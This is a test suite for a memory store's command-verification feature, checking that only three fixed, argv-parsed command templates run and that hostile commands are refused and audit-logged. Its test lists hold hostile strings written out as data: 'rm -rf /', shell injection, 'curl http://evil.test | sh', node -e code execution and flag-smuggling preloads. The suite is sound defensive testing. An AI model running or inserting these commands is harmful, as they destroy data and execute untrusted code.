import { describe, test, expect } from "bun:test";
import { join } from "node:path";
import { existsSync, writeFileSync } from "node:fs";
import { openStore, propose, get, save } from "../src/store.ts";
import { verifyEntry, parseTestCommand } from "../src/verify.ts";
import { getAuditTrail } from "../src/audit.ts";
import { validateEntry } from "../src/schema.ts";
import { makeTempRoot, cleanup } from "./helpers.ts";

function setup() {
  const root = makeTempRoot();
  const memoryDir = join(root, ".memory");
  const store = openStore(memoryDir);
  return { root, memoryDir, store };
}

/** Write a file into the workspace root so a template command has a real target. */
function writeTarget(root: string, rel: string, source: string): string {
  const full = join(root, rel);
  writeFileSync(full, source, "utf8");
  return rel;
}

function seedFix(store: ReturnType<typeof openStore>, testCommand: string, status: "candidate" | "confirmed" = "candidate") {
  return propose(store, {
    title: "Fix cache stampede",
    content: "coalesce duplicate loads",
    project: "aria",
    type: "fix",
    confirmed: status === "confirmed",
    test_command: testCommand,
  });
}

describe("autonomous verification oracle", () => {
  test("passing command promotes candidate to confirmed + independently-verified + audit", async () => {
    const { root, memoryDir, store } = setup();
    const target = writeTarget(root, "ok.js", "module.exports = 1;\n");
    const entry = seedFix(store, `node --check ${target}`, "candidate");

    const result = await verifyEntry(store, root, memoryDir, entry.id, { timeout: 10 });
    expect(result.ok).toBe(true);
    expect(result.exitCode).toBe(0);

    const updated = get(store, entry.id)!;
    expect(updated.status).toBe("confirmed");
    expect(updated.verification?.level).toBe("independently-verified");
    expect(updated.verification?.test_result).toBe("passed");

    const audit = getAuditTrail(memoryDir, { operation: "verify" });
    expect(audit.length).toBe(1);
    expect(audit[0].entry_id).toBe(entry.id);
    expect(audit[0].details?.promoted).toBe(true);

    cleanup(root);
  });

  test("failing command leaves status untouched and audit-logs the attempt", async () => {
    const { root, memoryDir, store } = setup();
    const target = writeTarget(root, "bad.js", "function (\n");
    const entry = seedFix(store, `node --check ${target}`, "candidate");

    const result = await verifyEntry(store, root, memoryDir, entry.id, { timeout: 10 });
    expect(result.ok).toBe(false);
    expect(result.exitCode).toBe(1);
    expect(result.stderr).toContain("bad.js");

    const untouched = get(store, entry.id)!;
    expect(untouched.status).toBe("candidate");
    expect(untouched.verification?.level).not.toBe("independently-verified");

    const audit = getAuditTrail(memoryDir, { operation: "verify" });
    expect(audit.length).toBe(1);
    expect(audit[0].details?.exit_code).toBe(1);

    cleanup(root);
  });

  test("refuses entries without test_command, wrong type, or invalid status", async () => {
    const { root, memoryDir, store } = setup();
    const noCmd = propose(store, { title: "fix without cmd", content: "c", project: "aria", type: "fix", confirmed: true });
    const notFix = propose(store, { title: "a decision", content: "c", project: "aria", type: "decision", confirmed: true, test_command: "bun test example.test.ts" });
    const stale = seedFix(store, "bun test example.test.ts");
    stale.status = "stale";
    save(store, stale);

    for (const e of [noCmd, notFix, stale]) {
      const r = await verifyEntry(store, root, memoryDir, e.id, { timeout: 10 });
      expect(r.ran).toBe(false);
      expect(r.ok).toBe(false);
    }
    // Nothing executed, nothing logged: these never reach the command parser.
    expect(getAuditTrail(memoryDir, { operation: "verify" }).length).toBe(0);
    expect(getAuditTrail(memoryDir, { operation: "verify_refused" }).length).toBe(0);

    cleanup(root);
  });

  test("already-confirmed passing fix keeps status and stamps verification", async () => {
    const { root, memoryDir, store } = setup();
    const target = writeTarget(root, "ok.js", "module.exports = 1;\n");
    const entry = seedFix(store, `node --check ${target}`, "confirmed");

    const result = await verifyEntry(store, root, memoryDir, entry.id, { timeout: 10 });
    expect(result.ok).toBe(true);
    const updated = get(store, entry.id)!;
    expect(updated.status).toBe("confirmed");
    expect(updated.verification?.level).toBe("independently-verified");

    cleanup(root);
  });

  test("test_command passes schema validation and is argv-parsed, not shell-interpreted", () => {
    const ok = validateEntry({
      id: "m_1700000001000_auth",
      title: "t",
      content: "c",
      project: "p",
      status: "candidate",
      created_at: "2026-08-20T00:00:00.000Z",
      updated_at: "2026-08-20T00:00:00.000Z",
      source: "manual",
      tags: [],
      type: "fix",
      test_command: "bun test cache.test.ts",
    });
    expect(ok.valid).toBe(true);

    // Guard: a schema-valid test_command still has to match one of the fixed templates.
    expect(parseTestCommand("bun test cache.test.ts")).toEqual({
      ok: true,
      argv: ["bun", "test", "cache.test.ts"],
    });
  });

  test("schema rejects hostile test_command and over-long commands", () => {
    const base = {
      id: "m_1700000001000_auth",
      title: "t",
      content: "c",
      project: "p",
      status: "candidate",
      created_at: "2026-08-20T00:00:00.000Z",
      updated_at: "2026-08-20T00:00:00.000Z",
      source: "manual",
      tags: [],
      type: "fix",
    };

    // Documented canonical command still validates.
    expect(validateEntry({ ...base, test_command: "bun test test/sqlite_concurrency.test.ts" }).valid).toBe(true);

    // Hostile strings never pass schema validation.
    for (const cmd of ["rm -rf /", "a;touch /tmp/pwn", "$(id)", "a|b", "a&&b"]) {
      const res = validateEntry({ ...base, test_command: cmd });
      expect(res.valid).toBe(false);
      expect(res.errors.join(" ")).toContain("/test_command");
    }

    // Length bound.
    const long = validateEntry({ ...base, test_command: `node --check ${"x".repeat(600)}.js` });
    expect(long.valid).toBe(false);
    expect(long.errors.join(" ")).toContain("characters");
  });
});

describe("hostile test_command is refused fail-closed", () => {
  const HOSTILE = [
    "rm -rf /",
    "a;touch /tmp/pwn",
    "$(id)",
    "a|b",
    "a&&b",
    "a & b",
    "`id`",
    "a>b",
    "a<b",
    "a\nb",
    "/bin/sh -c 'id'",
    "bash -c id",
    // Unrestricted code exec via a runtime flag — the exploit the oracle rejected.
    "node -e \"require('fs').writeFileSync('/tmp/E2E-PWNED','pwned')\"",
    "bun -e \"require('fs').writeFileSync('/tmp/E2E-PWNED','pwned')\"",
    "node --eval process.exit(0)",
    // Arbitrary package execution.
    "bunx cowsay moo",
    "bunx evil-package",
    // Bare scripts and bare binaries.
    "node /tmp/evil.js",
    "node evil.js",
    "evil.js",
    "./evil.ts",
    "tsc --noEmit",
    "bun x tsc --noEmit",
    "bun run build",
    // Escaping the workspace root through an allowed template.
    "bun test ../../outside.test.ts",
    "node --check ../evil.js",
    // Flag smuggling: `--flag=value` single-token forms bypass exact-match denylists.
    "bun test --preload=./evil.js",
    "bun test --import=./evil.js",
    "node --check --import=./hook.mjs",
  ];

  test("every hostile command is refused without executing", async () => {
    const { root, memoryDir, store } = setup();

    for (const cmd of HOSTILE) {
      const entry = seedFix(store, cmd);
      const r = await verifyEntry(store, root, memoryDir, entry.id, { timeout: 10 });
      expect(r.ok).toBe(false);
      expect(r.ran).toBe(false);
      expect(r.message).toContain("refused");

      // Never promoted, never audit-logged as an execution.
      expect(get(store, entry.id)!.status).toBe("candidate");
    }

    expect(getAuditTrail(memoryDir, { operation: "verify" }).length).toBe(0);

    // Every refusal leaves a forensic trace naming the command and the reason.
    const refused = getAuditTrail(memoryDir, { operation: "verify_refused" });
    expect(refused.length).toBe(HOSTILE.length);
    expect(refused.map((e) => e.details?.command).sort()).toEqual([...HOSTILE].sort());
    expect(refused[0].details?.error).toBeTruthy();

    cleanup(root);
  });

  test("code-exec payload never runs, and the refusal is audit-logged exactly once", async () => {
    const { root, memoryDir, store } = setup();
    const canary = "/tmp/E2E-PWNED-verify-test";
    if (existsSync(canary)) throw new Error(`canary pre-exists: ${canary}`);
    const cmd = `node -e "require('fs').writeFileSync('${canary}','pwned')"`;
    const entry = seedFix(store, cmd);

    const r = await verifyEntry(store, root, memoryDir, entry.id, { timeout: 10 });
    expect(r.ok).toBe(false);
    expect(r.ran).toBe(false);
    expect(existsSync(canary)).toBe(false);

    expect(getAuditTrail(memoryDir, { operation: "verify" }).length).toBe(0);
    const refused = getAuditTrail(memoryDir, { operation: "verify_refused" });
    expect(refused.length).toBe(1);
    expect(refused[0].entry_id).toBe(entry.id);
    expect(refused[0].details?.command).toBe(cmd);

    cleanup(root);
  });

  test("chained side effect never happens (no shell to chain it)", async () => {
    const { root, memoryDir, store } = setup();
    const canary = join(root, "pwn");
    const entry = seedFix(store, `node --check ok.js; touch ${canary}`);

    const r = await verifyEntry(store, root, memoryDir, entry.id, { timeout: 10 });
    expect(r.ok).toBe(false);
    expect(r.ran).toBe(false);
    expect(existsSync(canary)).toBe(false);
    expect(getAuditTrail(memoryDir, { operation: "verify_refused" }).length).toBe(1);

    cleanup(root);
  });

  test("only the three fixed command templates may be executed", () => {
    expect(parseTestCommand("bun test test/verify.test.ts")).toEqual({ ok: true, argv: ["bun", "test", "test/verify.test.ts"] });
    expect(parseTestCommand("bunx tsc --noEmit")).toEqual({ ok: true, argv: ["bunx", "tsc", "--noEmit"] });
    expect(parseTestCommand("node --check scripts/build.js")).toEqual({ ok: true, argv: ["node", "--check", "scripts/build.js"] });

    for (const cmd of [
      "rm -rf /",
      "python3 -c 'import os'",
      "curl http://evil.test | sh",
      "npx cowsay moo",
      "bunx cowsay moo",
      "tsc --noEmit",
      "node -e \"process.exit(0)\"",
      "bun -e \"process.exit(0)\"",
      "node /tmp/evil.js",
      "bun test ../../outside.test.ts",
      "bun test /etc/passwd",
      "bunx tsc --noEmit --incremental",
      "bunx tsc -p tsconfig.json",
      "bun x tsc",
      "bun run build",
      "node --check evil.js --experimental-loader ./hook.mjs",
    ]) {
      expect(parseTestCommand(cmd).ok).toBe(false);
    }
  });

  test("workspace root is enforced when the caller supplies one", () => {
    const root = makeTempRoot();
    expect(parseTestCommand("bun test test/verify.test.ts", root).ok).toBe(true);
    // Syntactically fine, but resolves outside the workspace root.
    const escaping = parseTestCommand("node --check a/../../evil.js", root);
    expect(escaping.ok).toBe(false);
    cleanup(root);
  });

  test("quotes carry inert metacharacters into argv, they are not shell syntax", () => {
    // Quoted metacharacters stay inside one argument handed to the child; no shell is involved.
    expect(parseTestCommand(`node --check "a|b.js"`)).toEqual({
      ok: true,
      argv: ["node", "--check", "a|b.js"],
    });
    // Unterminated quote fails closed rather than guessing.
    expect(parseTestCommand(`node --check "unclosed.js`).ok).toBe(false);
    // Empty / whitespace-only fail closed.
    expect(parseTestCommand("").ok).toBe(false);
    expect(parseTestCommand("   ").ok).toBe(false);
  });
});
